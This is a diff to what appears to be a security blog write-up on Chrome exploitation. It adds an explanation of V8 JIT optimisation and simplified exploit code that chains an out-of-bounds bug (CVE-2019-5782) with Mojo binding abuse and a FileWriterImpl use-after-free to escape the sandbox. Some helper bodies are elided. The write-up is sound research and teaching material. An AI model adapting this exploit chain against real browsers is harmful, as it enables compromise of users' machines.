@@ -109,7 +109,17 @@ console.log(fun(...args)) // output?
 
 You may notice that if you run that JS code in a javascript console (e.g. Chrome dev console), it will still output `['y']`. Does this means that our exploit does not work?
 
-Note that to make the optimizer remove the bounds-checking, we may need to run the function a lot of times before, thus triggering the optimizer to optimize our `fun` function, eliminating the bounds checking.
+Chrome is using V8 Javascript Engine which implementing JIT (Just-in-Time) paradigm, which combines the use of interpreter and compiler for executing code.
+Basically, a code will be executed with interpreter (_Ignition_) by default, and V8 will keep track of how many times the code segments are executed.
+If the code segments are executed many times (hot code segments), the code segments will be compiled with a compiler (_TurboFan_).
+In this compilation, optimizations will be applied, thus producing a faster execution time.
+
+
+{{< figure src="/post_assets/006/oob_jit.png" position="center" style="width: 100%; max-width: 700px;" caption="" captionPosition="center" >}}
+
+
+Therefore, to make the optimizer remove the bounds-checking, we may need to run the function a lot of times before, 
+thus triggering the JS engine to compile and optimize our `fun` function, eliminating the bounds checking.
 
 ```js
 function fun(arg) {
@@ -245,6 +255,89 @@ The steps are as follows:
 When the browser process use the stale pointer inside the unretained FileWriterImpl reference, the browser will crash.
 
 ![Out-of-Bound screenshots](/post_assets/006/sandbox_idea.gif)
+
+
+We are reusing some of the code in the attached exploit at [Issue 1755 bug tracking](https://bugs.chromium.org/p/project-zero/issues/detail?id=1755).
+The simplified code is as follows:
+
+```html
+<!-- index.html -->
+
+<script src="/many_args.js"></script>
+<script src="/enable_mojo.js"></script>
+<script src="/crash.js"></script>
+
+<script>
+  let oob = new many_args(); // setup OOB read/write
+  if (typeof(Mojo) !== "undefined") {
+    print('[enable_mojo] mojo already enabled')
+    crash(oob);
+  } else {
+    enable_mojo(oob);
+  }
+</script>
+```
+
+```js
+// crash.js
+
+async function CreateWriter() {
+  // create writer from blink.mojom.FileSystemManagerPtr ...
+}
+
+async function Blob0() {
+  // register blob_0 to blob registry ...
+}
+
+async function crash(oob) {
+  print('[sandbox_escape] exploiting issue_1755 to escape sandbox and crash browser');
+
+  var writer = await CreateWriter()
+
+  print('  [*] crafting renderer-hosted blob implementation')
+  function Blob0Impl() {
+    this.binding = new mojo.Binding(blink.mojom.Blob, this);
+  }
+  Blob0Impl.prototype = {
+    getInternalUUID: async (arg0) => {
+      print('  [*] getInternalUUID is called');
+
+      print('  [!] freeing FileWriterImpl');
+      create_writer_result.writer.ptr.reset();
+
+      // sleep 3 seconds ...
+
+      print('  [*] resuming FileWriterImpl::DoWrite, prepare to crash');
+      return {'uuid': 'blob_0'};
+    }
+  };
+
+  Blob0();
+
+  let blob_impl = new Blob0Impl();
+  let blob_impl_ptr = new blink.mojom.BlobPtr();
+  blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));
+
+  print('  [*] calling Write with renderer-hosted blob implementation')
+  writer.writer.write(0, blob_impl_ptr);
+}
+```
+
+In `index.html`, we are setting up Out-of-Bound read/write bug by exploiting CVE-2019-5782.
+Then, at first we visit the page, we enable the Mojo binding, and reload the page.
+Now that the Mojo binding is enabled (not undefined), we call the `crash` function.
+
+In `crash` function, we are registering a blob with id `blob_0` to blob registry,
+then we define our custom Blob implementation with a malicious implemenation of `getInternalUUID`.
+Finally we call the `Write` function with a custom renderer-hosted blob implementation.
+
+Inside our custom `getInternalUUID`, we free the `FileWriterImpl` instance.
+When the function return and the execution is passed to `DoWrite`, the freed / stale pointer will be used, causing the browser to crash.
+
+
+### Demo
+
+![Sandbox escape demo](/post_assets/006/sandbox_escape.gif)
 
 
 ## Conclusion
